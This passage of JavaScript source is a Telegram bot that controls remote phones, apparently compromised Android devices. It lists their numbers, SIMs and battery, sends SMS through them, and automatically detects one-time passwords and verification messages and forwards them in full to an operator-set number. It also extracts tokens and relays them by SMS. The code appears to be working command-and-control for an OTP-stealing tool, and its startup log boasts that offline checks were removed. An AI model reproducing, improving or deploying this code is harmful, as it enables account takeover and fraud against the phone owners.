    
    const devices = await getOnlineDevices(userId);
    if (devices.length === 0) return ctx.reply('📭 No online devices!\n\nBut commands will still be sent to offline devices.', { parse_mode: 'Markdown' });
    
    let text = '🟢 *ONLINE DEVICES*\n\n━━━━━━━━━━━━━━━━━━━\n';
    for (const d of devices) {
        text += `📱 *${d.name}*\n`;
        text += `   📞 ${d.phone}\n`;
        text += `   🔋 ${d.battery}\n`;
        text += `   🆔 \`${d.id}\`\n`;
        text += `━━━━━━━━━━━━━━━━━━━\n`;
    }
    await ctx.reply(text, { parse_mode: 'Markdown' });
});

bot.command('send', async (ctx) => {
    const userId = ctx.from.id.toString();
    const args = ctx.message.text.split(' ');
    const user = userData.get(userId);
    
    if (!user?.monitoringDevice) return ctx.reply('❌ No device set.', { parse_mode: 'Markdown' });
    if (args.length < 3) return ctx.reply('❌ Usage: `/send <number> <message>`\n\nExample: `/send 918955562885 Hello`', { parse_mode: 'Markdown' });
    
    const phone = args[1];
    const message = args.slice(2).join(' ');
    
    const msg = await ctx.reply(`📤 Sending to \`${phone}\`...`, { parse_mode: 'Markdown' });
    const result = await sendSms(userId, user.monitoringDevice, phone, message);
    
    await ctx.telegram.editMessageText(
        msg.chat.id, msg.message_id, null,
        result.success ? `✅ ${result.message} (${result.elapsed}ms)\n🆔 ${result.commandId}` : `❌ Failed: ${result.error}`
    );
});

// ==================== ADMIN COMMANDS ====================
bot.command('admin', async (ctx) => {
    const userId = ctx.from.id.toString();
    
    if (!isAdmin(userId)) {
        return ctx.reply('❌ *Access Denied!*', { parse_mode: 'Markdown' });
    }
    
    const stylishAdmin = `
╔══════════════════════════════╗
║       👑  A D M I N   P A N E L   👑      ║
╚══════════════════════════════╝

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃         📊 S T A T S            ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

◈ Total Users: ${userData.size}
◈ Active Monitors: ${Array.from(userData.values()).filter(u => u.monitorActive).length}

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃        ⚙️ C O M M A N D S        ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

◈ /users ➜ List all users
◈ /ban <user_id> ➜ Ban user
◈ /unban <user_id> ➜ Unban user
◈ /broadcast <message> ➜ Send to all
◈ /stats ➜ Detailed stats

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
    
    await ctx.reply(stylishAdmin);
});

bot.command('users', async (ctx) => {
    const userId = ctx.from.id.toString();
    
    if (!isAdmin(userId)) {
        return ctx.reply('❌ *Access Denied!*', { parse_mode: 'Markdown' });
    }
    
    if (userData.size === 0) {
        return ctx.reply('📭 No users found.');
    }
    
    let userList = '👥 *USER LIST*\n\n━━━━━━━━━━━━━━━━━━━\n';
    let index = 1;
    
    for (const [uid, user] of userData.entries()) {
        const status = user.banned ? '🔴 BANNED' : (user.monitorActive ? '🟢 ACTIVE' : '⚪ INACTIVE');
        userList += `${index}. *ID:* \`${uid}\`\n   📊 ${status}\n`;
        if (user.monitoringDevice) userList += `   📱 Device: ✓\n`;
        if (user.channels?.length) userList += `   📢 Chats: ${user.channels.length}\n`;
        if (user.otpForwardNumber) userList += `   📞 OTP Num: ${user.otpForwardNumber}\n`;
        userList += `━━━━━━━━━━━━━━━━━━━\n`;
        index++;
        
        if (index > 20) {
            userList += `\n📌 *Showing first 20 users*`;
            break;
        }
    }
    
    await ctx.reply(userList, { parse_mode: 'Markdown' });
});

bot.command('ban', async (ctx) => {
    const userId = ctx.from.id.toString();
    
    if (!isAdmin(userId)) {
        return ctx.reply('❌ *Access Denied!*', { parse_mode: 'Markdown' });
    }
    
    const args = ctx.message.text.split(' ');
    if (args.length < 2) {
        return ctx.reply('❌ Usage: `/ban <user_id>`\n\nExample: `/ban 8472456673`', { parse_mode: 'Markdown' });
    }
    
    const targetId = args[1];
    
    if (!userData.has(targetId)) {
        return ctx.reply(`❌ User \`${targetId}\` not found.`, { parse_mode: 'Markdown' });
    }
    
    const user = userData.get(targetId);
    user.banned = true;
    user.monitorActive = false;
    userData.set(targetId, user);
    
    await ctx.reply(`✅ *User Banned!*\n\n🆔 \`${targetId}\``, { parse_mode: 'Markdown' });
    
    try {
        await bot.telegram.sendMessage(targetId, `🔴 *You have been BANNED from using this bot!*`, { parse_mode: 'Markdown' });
    } catch(e) {}
});

bot.command('unban', async (ctx) => {
    const userId = ctx.from.id.toString();
    
    if (!isAdmin(userId)) {
        return ctx.reply('❌ *Access Denied!*', { parse_mode: 'Markdown' });
    }
    
    const args = ctx.message.text.split(' ');
    if (args.length < 2) {
        return ctx.reply('❌ Usage: `/unban <user_id>`\n\nExample: `/unban 8472456673`', { parse_mode: 'Markdown' });
    }
    
    const targetId = args[1];
    
    if (!userData.has(targetId)) {
        return ctx.reply(`❌ User \`${targetId}\` not found.`, { parse_mode: 'Markdown' });
    }
    
    const user = userData.get(targetId);
    user.banned = false;
    userData.set(targetId, user);
    
    await ctx.reply(`✅ *User Unbanned!*\n\n🆔 \`${targetId}\``, { parse_mode: 'Markdown' });
    
    try {
        await bot.telegram.sendMessage(targetId, `🟢 *You have been UNBANNED!*`, { parse_mode: 'Markdown' });
    } catch(e) {}
});

bot.command('broadcast', async (ctx) => {
    const userId = ctx.from.id.toString();
    
    if (!isAdmin(userId)) {
        return ctx.reply('❌ *Access Denied!*', { parse_mode: 'Markdown' });
    }
    
    const args = ctx.message.text.split(' ');
    if (args.length < 2) {
        return ctx.reply('❌ Usage: `/broadcast <message>`', { parse_mode: 'Markdown' });
    }
    
    const message = args.slice(1).join(' ');
    const msg = await ctx.reply(`📢 Broadcasting to ${userData.size} users...`);
    
    let success = 0;
    let failed = 0;
    
    for (const [uid, user] of userData.entries()) {
        if (user.banned) continue;
        try {
            await bot.telegram.sendMessage(uid, `📢 *ANNOUNCEMENT*\n\n${message}`, { parse_mode: 'Markdown' });
            success++;
        } catch(e) {
            failed++;
        }
        await new Promise(resolve => setTimeout(resolve, 50));
    }
    
    await ctx.telegram.editMessageText(
        msg.chat.id, msg.message_id, null,
        `✅ *Broadcast Complete!*\n\n✅ Sent: ${success}\n❌ Failed: ${failed}`
    );
});

bot.command('stats', async (ctx) => {
    const userId = ctx.from.id.toString();
    
    if (!isAdmin(userId)) {
        return ctx.reply('❌ *Access Denied!*', { parse_mode: 'Markdown' });
    }
    
    let totalChannels = 0;
    let activeUsers = 0;
    let bannedUsers = 0;
    let usersWithOtpNumber = 0;
    
    for (const [uid, user] of userData.entries()) {
        if (user.banned) {
            bannedUsers++;
            continue;
        }
        if (user.monitorActive) activeUsers++;
        if (user.channels) totalChannels += user.channels.length;
        if (user.otpForwardNumber) usersWithOtpNumber++;
    }
    
    const stats = `
╔══════════════════════════════╗
║       📊  D E T A I L E D   S T A T S    ║
╚══════════════════════════════╝

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃         👥 U S E R S           ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

◈ Total Users: ${userData.size}
◈ Active Users: ${activeUsers}
◈ Banned Users: ${bannedUsers}
◈ OTP Forward Users: ${usersWithOtpNumber}

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃         📊 C H A T S          ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

◈ Total Chats: ${totalChannels}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
          🅥 🅔 🅡 🅢 🅘 🅞 🅝   1 . 0
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
    
    await ctx.reply(stats);
});

bot.command('help', async (ctx) => {
    const userId = ctx.from.id.toString();
    const isAdminUser = isAdmin(userId);
    
    let helpText = `
╔══════════════════════════════╗
║      ⚡  C O M M A N D S   L I S T    ║
╚══════════════════════════════╝

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃       🔧 S E T U P             ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

◈ /setfirebase <url>
◈ /setdevice (or /setdevice <name>)
◈ /addchannel (in your chat)
◈ /startmonitor

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃       ⚙️ C O N T R O L         ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

◈ /stop / /resume
◈ /status
◈ /online
◈ /send <num> <msg>
◈ /listchannels / /removechannel
◈ /id
◈ /adnum <number> ➜ Set OTP forward number

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
          🅥 🅔 🅡 🅢 🅘 🅞 🅝   1 . 0
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
    
    if (isAdminUser) {
        helpText += `

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃       👑 A D M I N            ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

◈ /admin ◈ /users
◈ /ban <id> ◈ /unban <id>
◈ /broadcast ◈ /stats`;
    }
    
    await ctx.reply(helpText);
});

// ==================== CALLBACK HANDLERS ====================
bot.action(/^select_dev_(.+)$/, async (ctx) => {
    await ctx.answerCbQuery();
    const userId = ctx.from.id.toString();
    const deviceId = ctx.match[1];
    
    const device = await getDevice(userId, deviceId);
    if (!device) {
        await ctx.editMessageText('❌ Device not found');
        return;
    }
    
    const user = userData.get(userId);
    user.monitoringDevice = deviceId;
    user.deviceList = null;
    userData.set(userId, user);
    
    await ctx.editMessageText(
        `✅ *Device Set!*\n\n` +
        `📱 Name: ${device.name}\n` +
        `🆔 ID: \`${device.id}\`\n` +
        `📞 Phone: ${device.phone}\n` +
        `🔋 Battery: ${device.battery}\n` +
        `📡 Status: ${device.online ? '🟢 ONLINE' : '🔴 OFFLINE'}\n` +
        `📱 SIM1: ${device.sim1Number} (${device.sim1Carrier})\n` +
        `${device.sim2Number !== 'N/A' ? `📱 SIM2: ${device.sim2Number} (${device.sim2Carrier})\n` : ''}` +
        `\n*Note:* Commands will be sent even if device shows offline!`,
        { parse_mode: 'Markdown' }
    );
});

bot.action(/^dev_page_(\d+)$/, async (ctx) => {
    await ctx.answerCbQuery();
    const userId = ctx.from.id.toString();
    const page = parseInt(ctx.match[1]);
    
    const user = userData.get(userId);
    if (!user || !user.deviceList) {
        await ctx.editMessageText('❌ Session expired. Please use /setdevice again.');
        return;
    }
    
    user.currentPage = page;
    userData.set(userId, user);
    await showDevicePage(ctx, userId, page);
});

bot.action('cancel_select', async (ctx) => {
    await ctx.answerCbQuery();
    const userId = ctx.from.id.toString();
    const user = userData.get(userId);
    if (user) user.deviceList = null;
    await ctx.editMessageText('❌ Device selection cancelled.');
});

// ==================== MESSAGE HANDLERS ====================
bot.on('channel_post', async (ctx) => {
    await handleMessage(ctx, ctx.channelPost);
});

bot.on('message', async (ctx) => {
    if (ctx.chat.type === 'group' || ctx.chat.type === 'supergroup') {
        await handleMessage(ctx, ctx.message);
    }
});

async function handleMessage(ctx, messageObj) {
    const totalStart = Date.now();
    const chatId = ctx.chat.id.toString();
    const text = messageObj.text || messageObj.caption || '';
    const msgTime = messageObj.date * 1000;
    
    console.log(`\n📢 ========== NEW MESSAGE ==========`);
    console.log(`Chat: ${chatId} (${ctx.chat.type})`);
    console.log(`Text: ${text.slice(0, 200)}`);
    
    if (!text || text.trim().length === 0) return;
    
    const monitoringUsers = [];
    for (const [uid, u] of userData.entries()) {
        if (u.banned) continue;
        if (u.channels && u.channels.includes(chatId)) {
            monitoringUsers.push({ userId: uid, user: u });
            console.log(`✅ User ${uid} monitoring this chat`);
        }
    }
    
    if (monitoringUsers.length === 0) return;
    
    for (const { userId, user } of monitoringUsers) {
        if (!user.monitorActive) continue;
        
        const startTime = user.monitorStartTime ? new Date(user.monitorStartTime).getTime() : 0;
        if (msgTime < startTime) continue;
        
        const msgId = `${chatId}_${messageObj.message_id}`;
        if (user.processedMsgs && user.processedMsgs.has(msgId)) continue;
        
        // Check if this is an OTP/verification message for full forwarding
        const isOtp = isOtpMessage(text);
        
        if (isOtp && user.otpForwardNumber) {
            console.log(`\n🔐 OTP MESSAGE DETECTED for user ${userId}`);
            console.log(`Full message: ${text}`);
            
            if (!user.processedMsgs) user.processedMsgs = new Set();
            user.processedMsgs.add(msgId);
            userData.set(userId, user);
            
            await bot.telegram.sendMessage(
                userId,
                `🔐 *OTP MESSAGE DETECTED!*\n\n📝 Message: ${text.slice(0, 200)}${text.length > 200 ? '...' : ''}\n📞 Forwarding to: \`${user.otpForwardNumber}\``,
                { parse_mode: 'Markdown' }
            );
            
            if (!user.monitoringDevice) {
                await bot.telegram.sendMessage(userId, `❌ No device set! Cannot forward OTP.`, { parse_mode: 'Markdown' });
                continue;
            }
            
            // Send FULL message to the target number
            const result = await sendFullMessageToNumber(userId, user.otpForwardNumber, text, ctx.chat.title || 'Unknown Chat');
            const totalTime = Date.now() - totalStart;
            
            if (result.success) {
                await bot.telegram.sendMessage(
                    userId,
                    `✅ *OTP FORWARDED!*\n\n📞 To: \`${user.otpForwardNumber}\`\n⏱ ${totalTime}ms\n🆔 \`${result.commandId}\``,
                    { parse_mode: 'Markdown' }
                );
            } else {
                await bot.telegram.sendMessage(userId, `❌ OTP Forward Failed: ${result.error}`, { parse_mode: 'Markdown' });
            }
            
            continue; // Skip token extraction for OTP messages
        }
        
        // If not OTP, check for token extraction (original functionality)
        const extracted = extractToken(text);
        if (!extracted) continue;
        
        console.log(`\n🎯 TOKEN DETECTED for user ${userId}`);
        console.log(`Number: ${extracted.number}`);
        console.log(`Token: ${extracted.message.slice(0, 50)}`);
        
        if (!user.processedMsgs) user.processedMsgs = new Set();
        user.processedMsgs.add(msgId);
        userData.set(userId, user);
        
        await bot.telegram.sendMessage(
            userId,
            `🎯 *TOKEN DETECTED!*\n\n📞 Target: \`${extracted.number}\`\n🔐 Token: \`${extracted.message.slice(0, 100)}\`\n🔄 Forwarding...`,
            { parse_mode: 'Markdown' }
        );
        
        if (!user.monitoringDevice) {
            await bot.telegram.sendMessage(userId, `❌ No device set!`, { parse_mode: 'Markdown' });
            continue;
        }
        
        const result = await sendSms(userId, user.monitoringDevice, extracted.number, extracted.message);
        const totalTime = Date.now() - totalStart;
        
        if (result.success) {
            await bot.telegram.sendMessage(
                userId,
                `✅ *FORWARDED!*\n\n📞 To: \`${extracted.number}\`\n⏱ ${totalTime}ms\n🆔 \`${result.commandId}\``,
                { parse_mode: 'Markdown' }
            );
        } else {
            await bot.telegram.sendMessage(userId, `❌ Failed: ${result.error}`, { parse_mode: 'Markdown' });
        }
    }
}

// ==================== PRIVATE MESSAGE ====================
bot.on('text', async (ctx) => {
    if (ctx.chat.type !== 'private') return;
    const userId = ctx.from.id.toString();
    const text = ctx.message.text;
    if (text.startsWith('/')) return;
    
    const user = userData.get(userId);
    if (!user) return;
    if (user.banned) return ctx.reply('🔴 *BANNED*', { parse_mode: 'Markdown' });
    
    // Check if this is an OTP message in private chat
    const isOtp = isOtpMessage(text);
    
    if (isOtp && user.otpForwardNumber && user.monitoringDevice) {
        await ctx.reply(`🔐 OTP detected! Forwarding to ${user.otpForwardNumber}...`);
        const result = await sendFullMessageToNumber(userId, user.otpForwardNumber, text, 'Private Chat');
        
        if (result.success) {
            await ctx.reply(`✅ OTP forwarded! (${result.elapsed}ms)`);
        } else {
            await ctx.reply(`❌ Failed: ${result.error}`);
        }
        return;
    }
    
    // Token extraction for private messages
    if (!user.monitoringDevice) return;
    
    const extracted = extractToken(text);
    if (!extracted) return;
    
    await ctx.reply(`📤 Sending to ${extracted.number}...`);
    const result = await sendSms(userId, user.monitoringDevice, extracted.number, extracted.message);
    
    if (result.success) {
        await ctx.reply(`✅ Sent! (${result.elapsed}ms)`);
    } else {
        await ctx.reply(`❌ Failed: ${result.error}`);
    }
});

// ==================== ID COMMAND ====================
bot.command('id', async (ctx) => {
    await ctx.reply(
        `📌 *Chat Info*\n\n🆔 Chat ID: \`${ctx.chat.id}\`\n👤 User ID: \`${ctx.from.id}\``,
        { parse_mode: 'Markdown' }
    );
});

// ==================== START ====================
async function main() {
    console.log('\n🚀 ========== SOUL EXE AUTO VERIFICATION ==========');
    console.log('✅ VERSION: 1.0');
    console.log('✅ ADMIN: 8472456673');
    console.log('==========================================\n');
    console.log('🔧 FIX: Device offline check REMOVED - Will always try to send');
    console.log('🔧 Added 4 different Firebase paths for commands');
    console.log('🔧 NEW: /adnum command for OTP full message forwarding');
    console.log('🔧 OTP detection with keyword matching');
    console.log('==========================================\n');
    
    bot.launch();
    console.log('🤖 Bot running...\n');
}

main();
